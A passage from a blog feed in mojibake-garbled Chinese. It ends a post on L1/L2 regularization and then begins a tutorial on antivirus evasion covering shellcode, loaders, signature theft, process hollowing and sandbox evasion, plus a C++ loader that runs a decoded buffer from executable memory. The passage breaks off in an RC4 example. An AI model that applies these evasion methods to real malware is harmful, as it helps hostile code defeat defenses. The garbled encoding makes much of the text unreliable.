404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="msubsup" transform="translate(10829.3,0)"><g data-mml-node="mi"><path data-c="1D464" d="M580 385Q580 406 599 424T641 443Q659 443 674 425T690 368Q690 339 671 253Q656 197 644 161T609 80T554 12T482 -11Q438 -11 404 5T355 48Q354 47 352 44Q311 -11 252 -11Q226 -11 202 -5T155 14T118 53T104 116Q104 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Q21 293 29 315T52 366T96 418T161 441Q204 441 227 416T250 358Q250 340 217 250T184 111Q184 65 205 46T258 26Q301 26 334 87L339 96V119Q339 122 339 128T340 136T341 143T342 152T345 165T348 182T354 206T362 238T373 281Q402 395 406 404Q419 431 449 431Q468 431 475 421T483 402Q483 389 454 274T422 142Q420 131 420 107V100Q420 85 423 71T442 42T487 26Q558 26 600 148Q609 171 620 213T632 273Q632 306 619 325T593 357T580 385Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(749,413) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(749,-247) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g></g></g></g></svg><mjx-assistive-mml unselectable="on" display="block" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; overflow: hidden; width: 100%;"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><mtext>Loss</mtext><mo>=</mo><mtext>åŸå§‹æŸå¤±</mtext><mo>+</mo><mi>Î»</mi><munder><mo data-mjx-texclass="OP">âˆ‘</mo><mrow data-mjx-texclass="ORD"><mi>i</mi></mrow></munder><msubsup><mi>w</mi><mi>i</mi><mn>2</mn></msubsup></math></mjx-assistive-mml></mjx-container><ul><li>æ•ˆæœï¼šé¼“åŠ±æƒé‡å˜å°ä½†ä¸ä¸ºé›¶ï¼Œé€‚åˆå¤§å¤šæ•°æ¨¡å‹ã€‚</li></ul><h3 id="L1æ­£åˆ™åŒ–-Lassoæ­£åˆ™">L1æ­£åˆ™åŒ–(Lassoæ­£åˆ™)</h3><ul><li>æƒ©ç½šé¡¹ï¼šæ‰€æœ‰æƒé‡çš„ç»å¯¹å€¼å’Œ</li></ul><mjx-container class="MathJax" jax="SVG" display="true" style="direction: ltr; display: block; text-align: center; margin: 1em 0; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -2.697ex;" xmlns="http://www.w3.org/2000/svg" width="28.118ex" height="4.847ex" role="img" focusable="false" viewbox="0 -950 12428.3 2142.2" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mtext"><path data-c="4C" d="M128 622Q121 629 117 631T101 634T58 637H25V683H36Q48 680 182 680Q324 680 348 683H360V637H333Q273 637 258 635T233 622L232 342V129Q232 57 237 52Q243 47 313 47Q384 47 410 53Q470 70 498 110T536 221Q536 226 537 238T540 261T542 272T562 273H582V268Q580 265 568 137T554 5V0H25V46H58Q100 47 109 49T128 61V622Z" style="stroke-width: 3;"/><path data-c="6F" d="M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z" transform="translate(625,0)" style="stroke-width: 3;"/><path data-c="73" d="M295 316Q295 356 268 385T190 414Q154 414 128 401Q98 382 98 349Q97 344 98 336T114 312T157 287Q175 282 201 278T245 269T277 256Q294 248 310 236T342 195T359 133Q359 71 321 31T198 -10H190Q138 -10 94 26L86 19L77 10Q71 4 65 -1L54 -11H46H42Q39 -11 33 -5V74V132Q33 153 35 157T45 162H54Q66 162 70 158T75 146T82 119T101 77Q136 26 198 26Q295 26 295 104Q295 133 277 151Q257 175 194 187T111 210Q75 227 54 256T33 318Q33 357 50 384T93 424T143 442T187 447H198Q238 447 268 432L283 424L292 431Q302 440 314 448H322H326Q329 448 335 442V310L329 304H301Q295 310 295 316Z" transform="translate(1125,0)" style="stroke-width: 3;"/><path data-c="73" d="M295 316Q295 356 268 385T190 414Q154 414 128 401Q98 382 98 349Q97 344 98 336T114 312T157 287Q175 282 201 278T245 269T277 256Q294 248 310 236T342 195T359 133Q359 71 321 31T198 -10H190Q138 -10 94 26L86 19L77 10Q71 4 65 -1L54 -11H46H42Q39 -11 33 -5V74V132Q33 153 35 157T45 162H54Q66 162 70 158T75 146T82 119T101 77Q136 26 198 26Q295 26 295 104Q295 133 277 151Q257 175 194 187T111 210Q75 227 54 256T33 318Q33 357 50 384T93 424T143 442T187 447H198Q238 447 268 432L283 424L292 431Q302 440 314 448H322H326Q329 448 335 442V310L329 304H301Q295 310 295 316Z" transform="translate(1519,0)" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(2190.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="mtext" transform="translate(3246.6,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">åŸ</text><text data-variant="normal" transform="translate(1000,0) scale(1,-1)" font-size="884px" font-family="serif">å§‹</text><text data-variant="normal" transform="translate(2000,0) scale(1,-1)" font-size="884px" font-family="serif">æŸ</text><text data-variant="normal" transform="translate(3000,0) scale(1,-1)" font-size="884px" font-family="serif">å¤±</text></g><g data-mml-node="mo" transform="translate(7468.8,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(8469,0)"><path data-c="1D706" d="M166 673Q166 685 183 694H202Q292 691 316 644Q322 629 373 486T474 207T524 67Q531 47 537 34T546 15T551 6T555 2T556 -2T550 -11H482Q457 3 450 18T399 152L354 277L340 262Q327 246 293 207T236 141Q211 112 174 69Q123 9 111 -1T83 -12Q47 -12 47 20Q47 37 61 52T199 187Q229 216 266 252T321 306L338 322Q338 323 288 462T234 612Q214 657 183 657Q166 657 166 673Z" style="stroke-width: 3;"/></g><g data-mml-node="munder" transform="translate(9218.7,0)"><g data-mml-node="mo"><path data-c="2211" d="M60 948Q63 950 665 950H1267L1325 815Q1384 677 1388 669H1348L1341 683Q1320 724 1285 761Q1235 809 1174 838T1033 881T882 898T699 902H574H543H251L259 891Q722 258 724 252Q725 250 724 246Q721 243 460 -56L196 -356Q196 -357 407 -357Q459 -357 548 -357T676 -358Q812 -358 896 -353T1063 -332T1204 -283T1307 -196Q1328 -170 1348 -124H1388Q1388 -125 1381 -145T1356 -210T1325 -294L1267 -449L666 -450Q64 -450 61 -448Q55 -446 55 -439Q55 -437 57 -433L590 177Q590 178 557 222T452 366T322 544L56 909L55 924Q55 945 60 948Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(600,-1084.4) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(10829.3,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z" style="stroke-width: 3;"/></g><g data-mml-node="msub" transform="translate(11107.3,0)"><g data-mml-node="mi"><path data-c="1D464" d="M580 385Q580 406 599 424T641 443Q659 443 674 425T690 368Q690 339 671 253Q656 197 644 161T609 80T554 12T482 -11Q438 -11 404 5T355 48Q354 47 352 44Q311 -11 252 -11Q226 -11 202 -5T155 14T118 53T104 116Q104 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Q21 293 29 315T52 366T96 418T161 441Q204 441 227 416T250 358Q250 340 217 250T184 111Q184 65 205 46T258 26Q301 26 334 87L339 96V119Q339 122 339 128T340 136T341 143T342 152T345 165T348 182T354 206T362 238T373 281Q402 395 406 404Q419 431 449 431Q468 431 475 421T483 402Q483 389 454 274T422 142Q420 131 420 107V100Q420 85 423 71T442 42T487 26Q558 26 600 148Q609 171 620 213T632 273Q632 306 619 325T593 357T580 385Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(749,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g></g><g data-mml-node="mo" transform="translate(12150.3,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="block" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; overflow: hidden; width: 100%;"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><mtext>Loss</mtext><mo>=</mo><mtext>åŸå§‹æŸå¤±</mtext><mo>+</mo><mi>Î»</mi><munder><mo data-mjx-texclass="OP">âˆ‘</mo><mrow data-mjx-texclass="ORD"><mi>i</mi></mrow></munder><mo data-mjx-texclass="ORD" stretchy="false">|</mo><msub><mi>w</mi><mi>i</mi></msub><mo data-mjx-texclass="ORD" stretchy="false">|</mo></math></mjx-assistive-mml></mjx-container><ul><li>æ•ˆæœï¼šä¼šè®©ä¸€äº›æƒé‡å˜ä¸º 0ï¼Œç›¸å½“äºç‰¹å¾é€‰æ‹©ï¼ˆå˜å¾—ç¨€ç–ï¼‰ã€‚</li></ul><h2 id="å‚è€ƒ">å‚è€ƒ</h2><hr class="footnotes-sep"><section class="footnotes"><ol class="footnotes-list"><li id="fn1" class="footnote-item"><p><a href="https://github.com/x2nn/machine-learning">https://github.com/x2nn/machine-learning</a> <a href="#fnref1" class="footnote-backref">â†©ï¸</a></p></li></ol></section>]]></content>
      
      
      <categories>
          
          <category> AIç›¸å…³ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é€»è¾‘å›å½’ </tag>
            
            <tag> æœºå™¨å­¦ä¹  </tag>
            
            <tag> è¿‡æ‹Ÿåˆ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å…æ€åŸºç¡€çŸ¥è¯†</title>
      <link href="/2025/04/04/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
      <url>/2025/04/04/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h2 id="åŸºç¡€çŸ¥è¯†">åŸºç¡€çŸ¥è¯†</h2><h3 id="1-ä»€ä¹ˆæ˜¯å…æ€">1. ä»€ä¹ˆæ˜¯å…æ€?</h3><p>å…æ€ï¼ˆ<code>BypassAV</code>ï¼‰æ˜¯æŒ‡é€šè¿‡ä¿®æ”¹æ¶æ„è½¯ä»¶çš„è¡Œä¸ºã€ä»£ç ç»“æ„æˆ–åŠ è½½æ–¹å¼ï¼Œä½¿å…¶ä¸è¢«æ€æ¯’è½¯ä»¶æ£€æµ‹åˆ°ã€‚å…æ€æŠ€æœ¯å¹¿æ³›åº”ç”¨äºæ¸—é€æµ‹è¯•ã€çº¢é˜Ÿæ”»é˜²ç­‰é¢†åŸŸã€‚<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup></p><h3 id="2-å…æ€çš„å¸¸è§ç›®æ ‡">2.å…æ€çš„å¸¸è§ç›®æ ‡</h3><ul><li><p><strong>Windows Defender</strong>ï¼šWindowsç³»ç»Ÿè‡ªå¸¦çš„å®‰å…¨é˜²æŠ¤å·¥å…·ã€‚</p></li><li><p><strong>360å®‰å…¨å«å£«</strong>ï¼šå›½å†…å¸¸è§çš„æ€æ¯’è½¯ä»¶ï¼Œæ£€æµ‹èƒ½åŠ›è¾ƒå¼ºã€‚</p></li><li><p><strong>ç«ç»’</strong>ï¼šä¸€æ¬¾è½»é‡çº§çš„å›½äº§æ€è½¯ï¼Œä»¥ä½è¯¯æŠ¥ç‡è‘—ç§°ã€‚</p></li><li><p><strong>å¡å·´æ–¯åŸºã€ESETã€Norton</strong>ï¼šå›½å¤–å¸¸è§çš„æ€è½¯ï¼Œæ£€æµ‹èƒ½åŠ›è¾ƒå¼ºã€‚</p></li></ul><h3 id="3-å…æ€çš„æ ¸å¿ƒæ€æƒ³">3.å…æ€çš„æ ¸å¿ƒæ€æƒ³</h3><ul><li><p><strong>é™ä½ç‰¹å¾åŒ¹é…</strong>ï¼šå‡å°‘æ€è½¯ç‰¹å¾åº“ä¸­åŒ¹é…åˆ°çš„ç‰¹å¾ã€‚</p></li><li><p><strong>è¡Œä¸ºéšè—</strong>ï¼šé€šè¿‡æ··æ·†ã€åŠ å¯†ã€åˆ†ç¦»åŠ è½½ç­‰æ–¹å¼éšè—æ¶æ„è¡Œä¸ºã€‚</p></li><li><p><strong>åˆ©ç”¨ç³»ç»Ÿæœºåˆ¶</strong>ï¼šåˆ©ç”¨ç³»ç»ŸAPIã€å›è°ƒå‡½æ•°ç­‰åˆæ³•æœºåˆ¶æ‰§è¡Œæ¶æ„ä»£ç ã€‚</p></li></ul><h2 id="å…æ€ä¸­çš„ä¸“ä¸šåè¯">å…æ€ä¸­çš„ä¸“ä¸šåè¯</h2><h3 id="1-Shellcode">1. Shellcode</h3><ul><li><p><strong>å®šä¹‰</strong>ï¼šä¸€æ®µç”¨äºæ‰§è¡Œç‰¹å®šåŠŸèƒ½çš„æœºå™¨ä»£ç ï¼Œé€šå¸¸ä»¥äºŒè¿›åˆ¶å½¢å¼å­˜åœ¨ã€‚</p></li><li><p><strong>ç”¨é€”</strong>ï¼šå¸¸ç”¨äºåå‘è¿æ¥ã€æŒä¹…åŒ–ç­‰æ“ä½œã€‚</p></li><li><p><strong>å…æ€æ–¹æ³•</strong>ï¼šåŠ å¯†ã€æ··æ·†ã€åˆ†ç¦»åŠ è½½ã€‚</p></li></ul><p>ç®€å•ç†è§£ï¼Œå°±åƒä¸€æ®µé­”æ³•å’’è¯­ï¼Œå¿µå‡ºæ¥å°±èƒ½å®ç°ç‰¹å®šåŠŸèƒ½ã€‚</p><h3 id="2-Loaderï¼ˆåŠ è½½å™¨ï¼‰">2. Loaderï¼ˆåŠ è½½å™¨ï¼‰</h3><ul><li><p><strong>å®šä¹‰</strong>ï¼šç”¨äºåŠ è½½å’Œæ‰§è¡ŒShellcodeçš„ç¨‹åºã€‚</p></li><li><p><strong>ç”¨é€”</strong>ï¼šå°†åŠ å¯†æˆ–æ··æ·†çš„ShellcodeåŠ è½½åˆ°å†…å­˜ä¸­æ‰§è¡Œã€‚</p></li><li><p><strong>å…æ€æ–¹æ³•</strong>ï¼šä½¿ç”¨åˆæ³•APIã€å›è°ƒå‡½æ•°ã€å¤šçº¿ç¨‹ç­‰æŠ€æœ¯ã€‚</p></li></ul><p>ç®€å•ç†è§£ï¼Œå°±æ˜¯ä¸€ä¸ªç¨‹åºå¯åŠ¨å™¨ï¼Œç”¨æ¥å¯åŠ¨éœ€è¦å¯åŠ¨çš„æ¶æ„ç¨‹åºã€‚</p><h3 id="3-Obfuscationï¼ˆæ··æ·†ï¼‰">3. Obfuscationï¼ˆæ··æ·†ï¼‰</h3><ul><li><p><strong>å®šä¹‰</strong>ï¼šé€šè¿‡ä¿®æ”¹ä»£ç ç»“æ„ã€å˜é‡åã€æ§åˆ¶æµç­‰ï¼Œä½¿ä»£ç éš¾ä»¥ç†è§£ã€‚</p></li><li><p><strong>ç”¨é€”</strong>ï¼šé™ä½æ€è½¯é™æ€åˆ†æçš„æ•ˆæœã€‚</p></li><li><p><strong>å¸¸è§å·¥å…·</strong>ï¼šConfuserExã€Dotfuscatorã€‚</p></li></ul><p>ç®€å•ç†è§£ï¼Œå°±åƒæŠŠä¸€ç¯‡æ–‡ç« å†™å¾—ä¹±ä¸ƒå…«ç³Ÿï¼Œè°ä¹Ÿçœ‹ä¸æ‡‚ã€‚</p><h3 id="4-Entropyï¼ˆç†µå€¼ï¼‰">4. Entropyï¼ˆç†µå€¼ï¼‰</h3><ul><li><p><strong>å®šä¹‰</strong>ï¼šè¡¡é‡æ•°æ®éšæœºæ€§çš„æŒ‡æ ‡ï¼Œç†µå€¼è¶Šé«˜ï¼Œæ•°æ®è¶Šéšæœºã€‚</p></li><li><p><strong>ç”¨é€”</strong>ï¼šæ€è½¯é€šè¿‡æ£€æµ‹é«˜ç†µå€¼æ•°æ®æ¥è¯†åˆ«åŠ å¯†çš„æ¶æ„ä»£ç ã€‚</p></li><li><p><strong>å…æ€æ–¹æ³•</strong>ï¼šé™ä½Shellcodeçš„ç†µå€¼ï¼Œä¾‹å¦‚åˆ†æ®µåŠ è½½ã€‚</p></li></ul><p>ç®€å•ç†è§£ï¼Œå°±åƒæ£€æµ‹é£Ÿç‰©çš„è¾£åº¦ï¼Œå¤ªè¾£äº†å°±ä¼šå¼•èµ·æ³¨æ„ã€‚</p><h3 id="5-Signatureï¼ˆç­¾åï¼‰">5. Signatureï¼ˆç­¾åï¼‰</h3><ul><li><p><strong>å®šä¹‰</strong>ï¼šç”¨äºéªŒè¯ç¨‹åºåˆæ³•æ€§çš„æ•°å­—è¯ä¹¦ã€‚</p></li><li><p><strong>ç”¨é€”</strong>ï¼šåŠ«æŒåˆæ³•ç­¾åå¯ä»¥ç»•è¿‡æ€è½¯çš„ä¿¡ä»»æœºåˆ¶ã€‚</p></li><li><p><strong>å…æ€å·¥å…·</strong>ï¼šSigThiefã€‚</p></li></ul><p>ç®€å•ç†è§£ï¼Œå°±åƒä¼ªé€ èº«ä»½è¯ï¼Œéª—è¿‡å®‰æ£€äººå‘˜ã€‚</p><h3 id="6-Reflective-DLL-Injectionï¼ˆåå°„å¼DLLæ³¨å…¥ï¼‰">6. Reflective DLL Injectionï¼ˆåå°„å¼DLLæ³¨å…¥ï¼‰</h3><ul><li><p><strong>å®šä¹‰</strong>ï¼šä¸€ç§å°†DLLç›´æ¥åŠ è½½åˆ°ç›®æ ‡è¿›ç¨‹å†…å­˜ä¸­çš„æŠ€æœ¯ï¼Œæ— éœ€å°†DLLå†™å…¥ç£ç›˜ã€‚</p></li><li><p><strong>ç”¨é€”</strong>ï¼šå¸¸ç”¨äºç»•è¿‡æ€è½¯çš„æ–‡ä»¶æ‰«æå’Œé™æ€æ£€æµ‹ã€‚</p></li></ul><p>ç®€å•ç†è§£ï¼Œå°±åƒæŠŠä¸€æœ¬ä¹¦çš„å†…å®¹ç›´æ¥å¡è¿›åˆ«äººçš„è„‘å­é‡Œï¼Œä¸ç”¨æŠŠä¹¦é€’ç»™ä»–ã€‚</p><h3 id="7-Process-Hollowingï¼ˆè¿›ç¨‹é•‚ç©ºï¼‰">7. Process Hollowingï¼ˆè¿›ç¨‹é•‚ç©ºï¼‰</h3><ul><li><p><strong>å®šä¹‰</strong>ï¼šä¸€ç§å°†åˆæ³•è¿›ç¨‹çš„å†…å®¹æ›¿æ¢ä¸ºæ¶æ„ä»£ç çš„æŠ€æœ¯ã€‚</p></li><li><p><strong>ç”¨é€”</strong>ï¼šå¸¸ç”¨äºéšè—æ¶æ„ä»£ç çš„è¡Œä¸ºã€‚</p></li></ul><p>ç®€å•ç†è§£ï¼Œå°±åƒæŠŠä¸€ä¸ªè‹¹æœæŒ–ç©ºï¼Œé‡Œé¢å¡äº†ä¸ªç‚¸å¼¹ï¼Œå¤–é¢çœ‹èµ·æ¥è¿˜æ˜¯ä¸ªè‹¹æœã€‚</p><h3 id="8-API-Hookingï¼ˆAPIé’©å­ï¼‰">8. API Hookingï¼ˆAPIé’©å­ï¼‰</h3><ul><li><p><strong>å®šä¹‰</strong>ï¼šä¸€ç§æ‹¦æˆªå’Œä¿®æ”¹APIè°ƒç”¨çš„æŠ€æœ¯ã€‚</p></li><li><p><strong>ç”¨é€”</strong>ï¼šå¸¸ç”¨äºéšè—æ¶æ„è¡Œä¸ºæˆ–ä¿®æ”¹ç¨‹åºè¡Œä¸ºã€‚</p></li></ul><p>ç®€å•ç†è§£ï¼Œå°±åƒåœ¨ç”µè¯çº¿ä¸Šè£…ä¸ªçªƒå¬å™¨ï¼Œå·å¬å¹¶ä¿®æ”¹å¯¹æ–¹çš„é€šè¯å†…å®¹ã€‚</p><h3 id="9-Code-Caveï¼ˆä»£ç æ´ç©´ï¼‰">9. Code Caveï¼ˆä»£ç æ´ç©´ï¼‰</h3><ul><li><p><strong>å®šä¹‰</strong>ï¼šä¸€æ®µæœªè¢«ä½¿ç”¨çš„å†…å­˜åŒºåŸŸï¼Œå¯ä»¥ç”¨æ¥æ’å…¥é¢å¤–çš„ä»£ç ã€‚</p></li><li><p><strong>ç”¨é€”</strong>ï¼šå¸¸ç”¨äºéšè—æ¶æ„ä»£ç æˆ–å¢åŠ åŠŸèƒ½ã€‚</p></li></ul><p>ç®€å•ç†è§£ï¼Œå°±åƒåœ¨å¢™é‡ŒæŒ–ä¸ªæ´ï¼Œé‡Œé¢è—äº†æŠŠé’¥åŒ™ã€‚</p><h3 id="10-Sandbox-Evasioï¼ˆæ²™ç®±é€ƒé€¸ï¼‰">10. Sandbox Evasioï¼ˆæ²™ç®±é€ƒé€¸ï¼‰</h3><ul><li><p><strong>å®šä¹‰</strong>ï¼šä¸€ç§æ£€æµ‹å’Œé€ƒé¿æ²™ç®±ç¯å¢ƒçš„æŠ€æœ¯ã€‚</p></li><li><p><strong>ç”¨é€”</strong>ï¼šå¸¸ç”¨äºé¿å…åœ¨æ²™ç®±ä¸­è¢«æ£€æµ‹ã€‚</p></li></ul><p>ç®€å•ç†è§£ï¼Œå°±åƒåœ¨å®éªŒå®¤é‡Œè£…æ­£å¸¸äººï¼Œä¸€å‡ºå®éªŒå®¤å°±å˜èº«åè›‹ã€‚</p><h2 id="å…æ€æŠ€æœ¯åˆ†ç±»">å…æ€æŠ€æœ¯åˆ†ç±»</h2><h3 id="1-é™æ€å…æ€">1. é™æ€å…æ€</h3><ul><li><strong>å®šä¹‰</strong>ï¼šé€šè¿‡ä¿®æ”¹æ–‡ä»¶ç»“æ„ã€ä»£ç æˆ–èµ„æºï¼Œé¿å…æ€è½¯é™æ€æ‰«ææ£€æµ‹ã€‚</li><li><strong>å¸¸è§æ–¹æ³•</strong>ï¼š<ul><li>ä»£ç æ··æ·†</li><li>åŠ å¯†<code>Shellcode</code></li><li>æ·»åŠ åˆæ³•ç­¾å</li><li>ä¿®æ”¹æ–‡ä»¶å›¾æ ‡</li></ul></li></ul><h4 id="Base64æ··æ·†Shellcode"><code>Base64</code>æ··æ·†<code>Shellcode</code></h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Base64æ··æ·†Shellcode</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span>Â <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span>Â <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span>Â <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ç®€å•Base64è§£ç å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="type">unsigned</span>Â <span class="type">char</span>*Â <span class="title">base64_decode</span><span class="params">(<span class="type">const</span>Â <span class="type">char</span>* input)</span>Â </span>&#123;</span><br><span class="line">Â  Â Â <span class="comment">// å®ç°Base64è§£ç é€»è¾‘ï¼ˆæ­¤å¤„çœç•¥å…·ä½“å®ç°ï¼‰</span></span><br><span class="line">Â  Â Â <span class="keyword">return</span>Â (<span class="type">unsigned</span>Â <span class="type">char</span>*)input;Â <span class="comment">// å®é™…éœ€æ­£ç¡®è§£ç </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span>Â <span class="title">main</span><span class="params">()</span>Â </span>&#123;</span><br><span class="line">Â  Â Â <span class="type">const</span>Â <span class="type">char</span>* base64_shellcode =Â <span class="string">&quot;aGVsbG8gd29ybGQ=&quot;</span>;Â <span class="comment">// ç¤ºä¾‹Base64ç¼–ç çš„Shellcode</span></span><br><span class="line">Â  Â Â <span class="type">unsigned</span>Â <span class="type">char</span>* shellcode = <span class="built_in">base64_decode</span>(base64_shellcode);</span><br><span class="line">Â  Â Â </span><br><span class="line">Â  Â Â <span class="comment">// åˆ†é…å†…å­˜å¹¶æ‰§è¡Œ</span></span><br><span class="line">Â  Â Â <span class="type">void</span>* exec = <span class="built_in">VirtualAlloc</span>(<span class="number">0</span>,Â <span class="built_in">strlen</span>((<span class="type">char</span>*)shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">Â  Â Â <span class="built_in">memcpy</span>(exec, shellcode,Â <span class="built_in">strlen</span>((<span class="type">char</span>*)shellcode));</span><br><span class="line">Â  Â  ((<span class="built_in">void</span>(*)())exec)();</span><br><span class="line">Â  Â Â </span><br><span class="line">Â  Â Â <span class="keyword">return</span>Â <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="RC4åŠ å¯†Shellcode"><code>RC4</code>åŠ å¯†<code>Shellcode</code></h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 